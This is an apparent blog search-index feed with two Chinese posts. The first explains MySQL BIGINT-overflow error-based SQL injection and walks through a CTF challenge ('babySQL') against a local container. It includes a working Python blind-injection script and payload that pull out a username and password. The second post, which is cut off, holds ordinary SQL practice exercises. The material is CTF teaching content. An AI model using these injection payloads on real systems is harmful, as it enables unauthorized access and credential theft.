<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>基于MySQL大整数BIGINT溢出的SQL注入</title>
      <link href="/posts/myh10025.html"/>
      <url>/posts/myh10025.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="MySQL大整数溢出"><a href="#MySQL大整数溢出" class="headerlink" title="MySQL大整数溢出"></a>MySQL大整数溢出</h3><p>本篇参考自：<a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/">https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/</a></p><h4 id="1、MySQL的整数类型"><a href="#1、MySQL的整数类型" class="headerlink" title="1、MySQL的整数类型"></a>1、MySQL的整数类型</h4><p>如图是MySQL的整数类型及其范围：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000003.png"></p><p>可以看到对于BIGINT，是8个字节，即对应64bit。如果我们取有符号的最大值，它的二进制，十六进制和十进制分别为：“0B0111111111111111111111111111111111”，“0x7FFFFFFFFFFF”，“9223372036854775807”。如果我们对最大值进行相应的加一操作，就会报溢出错误：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select 9223372036854775807+1;ERROR 1690 (22003): BIGINT value is out of range in '(9223372036854775807 + 1)'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来我们看最大的无符号值，它的二进制，十六进制和十进制分别为：“0b1111111111111111111111111111111111111111111111111111111111111111”, “0xFFFFFFFFFFFFFFFF”, “18446744073709551615”。相应的如果我们对其进行加法操作也会造成整数溢出：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># In decimalmysql&gt; select 18446744073709551615+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'# In binarymysql&gt; select cast(b'1111111111111111111111111111111111111111111111111111111111111111' as unsigned)+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'# In hexmysql&gt; select cast(x'FFFFFFFFFFFFFFFF' as unsigned)+1;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、按位取反"><a href="#2、按位取反" class="headerlink" title="2、按位取反"></a>2、按位取反</h4><p>按位取反不同于 “!” 操作等，要理解按位取反，前提要知道数字是如何在计算机的底层存储的。</p><p>我们都知道，计算机存储和操作数据都是以二进制的形式，同时对于一个数，计算机是存储它的<strong>补码</strong>形式。先介绍一下相关概念。</p><p>我们就拿数字 9 和 -9 为例：</p><h5 id="原码："><a href="#原码：" class="headerlink" title="原码："></a>原码：</h5><p>9转化为2进制就是：00001001。(一字节表示)</p><p>-9转化为2进制就是：10001001。（最高位为符号位）</p><h5 id="反码："><a href="#反码：" class="headerlink" title="反码："></a>反码：</h5><p>如果为正数，即最高位是0：则反码和原码相同为：00001001</p><p>如果为负数，即最高位是1：则反码除了最高位其他位取反(这个不等价按位取反，即0变1，1变0)，结果就是：11110110</p><h5 id="补码："><a href="#补码：" class="headerlink" title="补码："></a>补码：</h5><p>如果为正数，即最高位是0：则补码和原码相同为： 00001001</p><p>如果为负数，即最高位是1：则补码是反码末位加一，即：11110111</p><p>接下来我们就来讲按位取反，对于一个十进制整数，我们以 9 为例，其基本步骤就是：</p><ul><li>首先计算出补码：00001001</li><li>对所有位进行取反操作：11110110</li><li>计算出去反后的补码对应的原码，相当去在取补码：10001010，即十进制数 -10</li></ul><p>接下来我们用python来验证一下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python <span class="token number">3.7</span><span class="token number">.9</span> <span class="token punctuation">(</span>tags<span class="token operator">/</span>v3<span class="token punctuation">.</span><span class="token number">7.9</span><span class="token punctuation">:</span><span class="token number">13c94747c7</span><span class="token punctuation">,</span> Aug <span class="token number">17</span> <span class="token number">2020</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">58</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">)</span>Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>让我们再用MySQL来验证一下，有意思的来了：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select ~9;+----------------------+| ~9                   |+----------------------+| 18446744073709551606 |+----------------------+1 row in set (0.01 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可能会很奇怪，为什么Mysql中计算的是18446744073709551606呢，即二进制：0b1111111111111111111111111111111111111111111111111111111111110110。那我们就计算一下，因为这个二进制看起来很熟悉，如果64位表示，则9的补码就是：0000000000000000000000000000000000000000000000000000000000001001，取反后为：1111111111111111111111111111111111111111111111111111111111110110，正好是上面的数，也就是当作了无符号数直接转化为10进制数了。这里我们翻一下官方文档就可以明白了：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000004.png"></p><p>可以看到，MySQL在相应的取反后<strong>结果是无符号整数</strong>！</p><p>在MySQL中如果我们对“0”进行位求反呢？它将产生最大无符号BIGINT值。这是显而易见的事实。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select ~0;+----------------------+| ~0                   |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们来算一下，0对应补码：0000000000000000000000000000000000000000000000000000000000000000，取反就是111111111111111111111111111111111111111111111111111111111111111喽，也就是最大整数值。</p><p>所以如果我们从~0中加或减，会导致一个BIGINT溢出错误。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select 1-~0;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 - ~(0))'mysql&gt; select 1+~0;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、报错注入"><a href="#3、报错注入" class="headerlink" title="3、报错注入"></a>3、报错注入</h4><p>我们想使用子查询导致大整数溢出，以便可以报错出数据。如果我们使用逻辑求反，它应该为任何查询返回1，因为在成功执行时，查询将返回0，当我们求反时，它将是1。例如，如果我们对一个查询应用逻辑否定，比如(select*from(select user())x)：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select (select*from(select user())x);+-------------------------------+| (select*from(select user())x) |+-------------------------------+| root@localhost                |+-------------------------------+1 row in set (0.00 sec)# Applying logical negationmysql&gt; select !(select*from(select user())x);+--------------------------------+| !(select*from(select user())x) |+--------------------------------+|                              1 |+--------------------------------+1 row in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此，我们可以简单地组合按位求反和逻辑求反，并构建基于错误的注入查询:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select ~0+!(select*from(select user())x);ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是我们尽量不要使用加法，因为在通过 Web 浏览器解析时，“+”会被转换为空格（您可以使用 %2b 来表示“+”）。相反，我们可以使用减法。</p><p>最终的查询将是：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">*</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token operator">-</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">!</span>x<span class="token operator">-</span><span class="token operator">~</span><span class="token number">0.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就像这样：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select username, password from users where id='1' or !(select*from(select user())x)-~0;ERROR 1690 (22003): BIGINT value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/">详细的注入以及提取数据的方法参见原文！</a></p><h4 id="4、2022虎符CTF-babySQL"><a href="#4、2022虎符CTF-babySQL" class="headerlink" title="4、2022虎符CTF-babySQL"></a>4、2022虎符CTF-babySQL</h4><p>这道题主要考察的就是针对两种回显方式，构造报错来辅助进行盲注。</p><p>题目环境可以docker pull下来，这个是从一个师傅那拿的，题目环境略有不同：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker pull ccr.ccs.tencentyun.com/cttf/hfctf-2022-babysqldocker run -dp <span class="token number">3000</span>:3000 ccr.ccs.tencentyun.com/cttf/hfctf-2022-babysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先题目给了hint.md:</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE TABLE `auth` (  `id` int NOT NULL AUTO_INCREMENT,  `username` varchar(32) NOT NULL,  `password` varchar(32) NOT NULL,  PRIMARY KEY (`id`),  UNIQUE KEY `auth_username_uindex` (`username`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@nestjs/common'</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">{</span> ConnectionProvider <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../database/connection.provider'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>  id<span class="token operator">:</span> number<span class="token punctuation">;</span>  username<span class="token operator">:</span> string<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token operator">:</span> string</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>  <span class="token keyword">const</span> r <span class="token operator">=</span> str    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[\s,()#;*\-]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^.*(?=union|binary).*$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AuthService</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> connectionProvider<span class="token operator">:</span> ConnectionProvider</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token keyword">async</span> <span class="token function">validateUser</span><span class="token punctuation">(</span>username<span class="token operator">:</span> string<span class="token punctuation">,</span> password<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>User<span class="token operator">&gt;</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">SELECT * FROM auth WHERE username='</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">safe</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">' LIMIT 1</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>rows<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>connectionProvider<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">c</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> c<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>user <span class="token operator">&amp;&amp;</span> user<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">// eslint-disable-next-line @typescript-eslint/no-unused-vars</span>      <span class="token keyword">const</span> <span class="token punctuation">{</span> password<span class="token punctuation">,</span> <span class="token operator">...</span>result <span class="token punctuation">}</span> <span class="token operator">=</span> user<span class="token punctuation">;</span>      <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入网站之后查看源码看到有前端限制：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000005.png"></p><p>这个可以通过直接发包绕过，比如抓包或者python发请求等。然后我们随便输入用户名和密码之后可以看到有一个<strong>401回显</strong>，表明用户密码不正确：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000006.png"></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000007.png" style="zoom:150%;"><p>这个时候我们看给出的原码可以看出，只要SQL执行成功都只会返回NULL，也就是js中的401。这个时候我们再试一下引发SQL报错：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost:3000/login'</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">"admin6661'"</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa'</span>        <span class="token punctuation">}</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python3 test2.py <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到是500回显，说明当SQL执行不成功就会返回500回显。<strong>重点就是如何利用这两个回显得到用户名和密码！</strong></p><p>我写一下我思考的大致思路：</p><blockquote><p>首先我们要知道我们是不能带出什么数据的，也就是我们只能进行盲注。目前给我们的有报错回显，那就是进行报错注入。那如何盲注，以及怎么知道我们注入的对不对呢？可以这样考虑，利用正则匹配，，如果匹配正确，那就正常返回SQL执行成功，如果匹配不正确，那就出发SQL报错，返回500，通过这个回显告诉我们匹配不对。接下来就是附上师傅写的代码。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://localhost:3000/login'</span>allowlist <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'[\s,()#;*\-]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Allow list:"</span><span class="token punctuation">,</span> allowlist<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1'||case`</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">`like'</span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">'COLLATE`utf8mb4_0900_as_cs`when'1'then'1'else~0+1+''end||'0"</span></span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa'</span>        <span class="token punctuation">}</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token comment">#用来占位，算出有多少位，然后用____来占位，也可以用%，直接通配后面的字符</span><span class="token comment">#因为_只匹配一个，所以直到_达到username的字符数量时才会匹配成功，此时才能返回401，即返回true，则可以计算出username的长度了。</span><span class="token keyword">def</span> <span class="token function">measure</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span>target<span class="token operator">=</span>target<span class="token punctuation">,</span> result<span class="token operator">=</span><span class="token string">'_'</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> i<span class="token comment">#爆破username</span>user <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Getting username ..."</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>measure<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> allowlist<span class="token punctuation">:</span>        <span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> user<span class="token operator">+</span>char<span class="token operator">+</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            user <span class="token operator">+=</span> char            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token comment">#爆破password</span>passwd <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Getting password ..."</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>measure<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> char <span class="token keyword">in</span> allowlist<span class="token punctuation">:</span>        <span class="token keyword">if</span> char <span class="token keyword">in</span> <span class="token string">'_%'</span><span class="token punctuation">:</span>            char <span class="token operator">=</span> <span class="token string">r'\\'</span><span class="token operator">+</span>char        <span class="token keyword">if</span> req<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> passwd<span class="token operator">+</span>char<span class="token operator">+</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            passwd <span class="token operator">+=</span> char            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] Done!\nusername: </span><span class="token interpolation"><span class="token punctuation">{</span>user<span class="token punctuation">}</span></span><span class="token string">\npassword: </span><span class="token interpolation"><span class="token punctuation">{</span>passwd<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在来分析一下这个payload:</p><ul><li>|| 是用来替代 or ，也是或的作用。这可能有点奇怪，没过滤 or 啊，是因为过滤了空格,使用or要使用空格区分左右语句。</li><li>接下来是个 case when then end 语句<ul><li>case<code>{target}</code>like’{result}’COLLATE<code>utf8mb4_0900_as_cs</code>。target就是选取指定的属性即username，然后进行like匹配，后面collate是区分大小写，因为MySQL中like不区分大小写。如果匹配成功返回1 ，不成功就返回0。</li><li>when’1’ 。即前面的匹配成功就执行when后面的then语句</li><li>then’1’ 。即返回1，相当于 ||1，即条件为真，此时SQL就执行成功，也代表我们盲注出一个字符。</li><li>else~0+1+’’ 。这个就是前面讲的BIGINT溢出报错。后面的 “ ，就是为了替代空格分割语句的作用。报错后就返回500回显，说明这个字符不对。</li></ul></li></ul><p>大概就是这样，这个payload里面还是有挺多知识点的。就像 collate 设置区分带小写，这也就是为什么过滤了 binary 。之后运行跑出用户名和密码：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000008.png"></p><p>登录即可拿到flag。</p><p>这道题学到的还挺多的，最重要的就是思路，利用好那两个回显。</p><p>最后推荐两篇基础的SQL注入博客：</p><p><a href="https://hatboy.github.io/2018/08/28/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">MySQL报错注入</a></p><p><a href="https://ro0t.top/cn/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ctf/202203260000009.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL练习（未整理好）</title>
      <link href="/posts/myh10024.html"/>
      <url>/posts/myh10024.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQL语句练习"><a href="#SQL语句练习" class="headerlink" title="SQL语句练习"></a>SQL语句练习</h2><h3 id="SQL1-获取每个部门中当前员工薪水最高的相关信息"><a href="#SQL1-获取每个部门中当前员工薪水最高的相关信息" class="headerlink" title="SQL1.获取每个部门中当前员工薪水最高的相关信息"></a>SQL1.获取每个部门中当前员工薪水最高的相关信息</h3><p>原题目地址：<a href="https://www.nowcoder.com/practice/4a052e3e1df5435880d4353eb18a91c6?tpId=82&amp;tags=&amp;title=&amp;difficulty=0&amp;judgeStatus=0&amp;rp=1&amp;sourceUrl=/exam/oj?tab=SQL%25E7%25AF%2587&amp;topicId=82">获取每个部门中当前员工薪水最高的相关信息</a></p><p>有一个员工表dept_emp简况如下:</p><table><thead><tr><th>emp_no</th><th>dept_no</th><th>from_date</th><th>to_date</th></tr></thead><tbody><tr><td>10001</td><td>d001</td><td>1986-06-26</td><td>9999-01-01</td></tr><tr><td>10002</td><td>d001</td><td>1996-08-03</td><td>9999-01-01</td></tr><tr><td>10003</td><td>d002</td><td>1996-08-03</td><td>9999-01-01</td></tr></tbody></table><p>有一个薪水表salaries简况如下:</p><table><thead><tr><th>emp_no</th><th>salary</th><th>from_date</th><th>to_date</th></tr></thead><tbody><tr><td>10001</td><td>88958</td><td>2002-06-22</td><td>9999-01-01</td></tr><tr><td>10002</td><td>72527</td><td>2001-08-02</td><td>9999-01-01</td></tr><tr><td>10003</td><td>92527</td><td>2001-08-02</td><td>9999-01-01</td></tr></tbody></table><p>获取每个部门中当前员工薪水最高的相关信息，给出dept_no, emp_no以及其对应的salary，按照部门编号dept_no升序排列，以上例子输出如下:</p><table><thead><tr><th>dept_no</th><th>emp_no</th><th>maxSalary</th></tr></thead><tbody><tr><td>d001</td><td>10001</td><td>88958</td></tr><tr><td>d002</td><td>10003</td><td>92527</td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">输入：<span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span>  <span class="token punctuation">`</span>dept_emp<span class="token punctuation">`</span> <span class="token punctuation">;</span> <span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span>  <span class="token punctuation">`</span>salaries<span class="token punctuation">`</span> <span class="token punctuation">;</span> <span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>dept_emp<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>dept_no<span class="token punctuation">`</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>from_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token punctuation">`</span>to_date<span class="token punctuation">`</span> <span class="token keyword">date</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>dept_no<span class="token punctuation">`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token punctuation">`</span>salaries<span class="token punctuation">`</span> <span class="token punctuation">(</span><span class="token punctuation">`</span>emp_no<span class="token punctuation">`</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span 